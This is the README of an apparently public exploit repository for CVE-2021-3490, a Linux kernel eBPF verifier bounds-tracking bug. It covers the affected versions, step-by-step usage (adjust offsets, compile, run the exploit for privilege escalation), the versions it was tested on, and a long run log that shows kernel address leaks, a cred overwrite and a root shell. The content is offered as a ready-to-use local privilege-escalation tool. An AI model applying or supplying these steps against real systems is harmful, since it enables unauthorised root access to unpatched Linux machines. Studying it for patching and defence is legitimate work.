# CVE-2021-3490
The eBPF ALU32 bounds tracking for bitwise ops (AND, OR and XOR) in the Linux kernel did not properly update 32-bit bounds, which could be turned into out of bounds reads and writes in the Linux kernel and therefore, arbitrary code execution. 

## Affect
This issue was fixed via commit 049c4e13714e ("bpf: Fix alu32 const subreg bound tracking on bitwise operations") (v5.13-rc4) and backported to the stable kernels in v5.12.4, v5.11.21, and v5.10.37. 
The AND/OR issues were introduced by commit 3f50f132d840 ("bpf: Verifier, do explicit ALU32 bounds tracking") (5.7-rc1) and the XOR variant was introduced by 2921c90d4718 ("bpf:Fix a verifier failure with xor") ( 5.10-rc1).

## Use
1. Modify all offsets marked as `#define OFF_` in exploit.c (If vmlinux/bzImage with debuginfo is available,  use `./get_offset.py` to get offsets)
2. Run `./compile.sh` to build
3. Run `./exploit` and get privilege escalation

## Further use
1. Get a piece of ebpf code that bypasses the verifier to implement BPF_REG_6 of value `verify:0   fact:1` 
2. Fill the ebpf code into `struct bpf_insn prog[]` trigger vulnerability stage


## Test
Work in [ubuntu linux 5.11.0](https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux-hwe-5.11/5.11.0-60.60/linux-hwe-5.11_5.11.0.orig.tar.gz) 

Not work (both CVE-2021-3490 and 板子) in [linux 5.16.12](https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.16.12.tar.xz), can't leak any address


```
/ $ ./exploit
[*] sneaking evil bpf past the verifier
processed 230 insns (limit 1000000) max_states_per_insn 1 total_states 20 peak_states 20 mark_read 3

[*] creating socketpair()
[*] attaching bpf backdoor to socket
leak addr: 0xffffffff820363e0
linux base: 0xffffffff81000000
value addr: 0xffff888004d8e110
init_pid_ns addr: 0xffffffff82a6b2c0
self pid is 124
task_struct addr: 0xffff888003a04500
iter pid 1 ...
[+] iter task 0xffff888003a00000 ...
iter pid 2 ...
[+] iter task 0xffff888003a01700 ...
iter pid 3 ...
[+] iter task 0xffff888003a02e00 ...
iter pid 4 ...
[+] iter task 0xffff888003a05c00 ...
iter pid 5 ...
[+] iter task 0xffff888003a31700 ...
iter pid 6 ...
[+] iter task 0xffff888003a32e00 ...
iter pid 7 ...
[+] iter task 0xffff888003a35c00 ...
iter pid 8 ...
[+] iter task 0xffff888003a34500 ...
iter pid 9 ...
[+] iter task 0xffff888003a30000 ...
iter pid 10 ...
[+] iter task 0xffff888003a49700 ...
iter pid 11 ...
[+] iter task 0xffff888003a4ae00 ...
iter pid 12 ...
[+] iter task 0xffff888003a4dc00 ...
iter pid 13 ...
[+] iter task 0xffff888003a4c500 ...
iter pid 14 ...
[+] iter task 0xffff888003a48000 ...
iter pid 15 ...
[+] iter task 0xffff888003a7ae00 ...
iter pid 16 ...
[+] iter task 0xffff888003a7dc00 ...
iter pid 17 ...
[+] iter task 0xffff888003a7c500 ...
iter pid 18 ...
[+] iter task 0xffff888003a78000 ...
iter pid 19 ...
[+] iter task 0xffff888003a79700 ...
iter pid 20 ...
[+] iter task 0xffff888003b54500 ...
iter pid 21 ...
[+] iter task 0xffff888003b50000 ...
iter pid 22 ...
[+] iter task 0xffff888003b51700 ...
iter pid 23 ...
[+] iter task 0xffff888003b52e00 ...
iter pid 24 ...
[+] iter task 0xffff888003b55c00 ...
iter pid 25 ...
[+] iter task 0xffff888003b95c00 ...
iter pid 71 ...
[+] iter task 0xffff888003b92e00 ...
iter pid 72 ...
[+] iter task 0xffff888003b91700 ...
iter pid 73 ...
[+] iter task 0xffff888003b94500 ...
iter pid 74 ...
[+] iter task 0xffff888003b90000 ...
iter pid 75 ...
[+] iter task 0xffff888003bb9700 ...
iter pid 76 ...
[+] iter task 0xffff888003bb8000 ...
iter pid 77 ...
[+] iter task 0xffff888003bbc500 ...
iter pid 78 ...
[+] iter task 0xffff888003bbdc00 ...
iter pid 79 ...
[+] iter task 0xffff888003bbae00 ...
iter pid 80 ...
[+] iter task 0xffff888003b70000 ...
iter pid 81 ...
[+] iter task 0xffff888003b71700 ...
iter pid 82 ...
[+] iter task 0xffff888003b72e00 ...
iter pid 83 ...
[+] iter task 0xffff888003b74500 ...
iter pid 85 ...
[+] iter task 0xffff888003b75c00 ...
iter pid 86 ...
[+] iter task 0xffff888003bb4500 ...
iter pid 87 ...
[+] iter task 0xffff888003bb5c00 ...
iter pid 88 ...
[+] iter task 0xffff888003bb2e00 ...
iter pid 89 ...
[+] iter task 0xffff888003bb1700 ...
iter pid 90 ...
[+] iter task 0xffff888003bb0000 ...
iter pid 91 ...
[+] iter task 0xffff888003ba8000 ...
iter pid 92 ...
[+] iter task 0xffff888003bac500 ...
iter pid 93 ...
[+] iter task 0xffff888003badc00 ...
iter pid 94 ...
[+] iter task 0xffff888003ba9700 ...
iter pid 96 ...
[+] iter task 0xffff888003b98000 ...
iter pid 104 ...
[+] iter task 0xffff888003b9c500 ...
iter pid 107 ...
[+] iter task 0xffff888003b99700 ...
iter pid 108 ...
[+] iter task 0xffff888003b8ae00 ...
iter pid 113 ...
[+] iter task 0xffff888003b8c500 ...
iter pid 122 ...
[+] iter task 0xffff888003b89700 ...
iter pid 123 ...
[+] iter task 0xffff888003b88000 ...
iter pid 124 ...
got it!
get cred_addr 0xffff888003b7ec00
cred->usage: 8
getting shell!
/ # 
```

## REF
- [CVE-2021-3490 Kernel Pwning with eBPF: a Love Story](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story)
- [CVE-2021-3490 eBPF 32位边界计算错误漏洞利用分析](https://www.anquanke.com/post/id/251933#h2-1)
- [CVE-2021-3490 exp by bsauce](https://github.com/bsauce/kernel-exploit-factory/blob/main/CVE-2021-3490/exp/5.11/CVE-2021-3490.c)

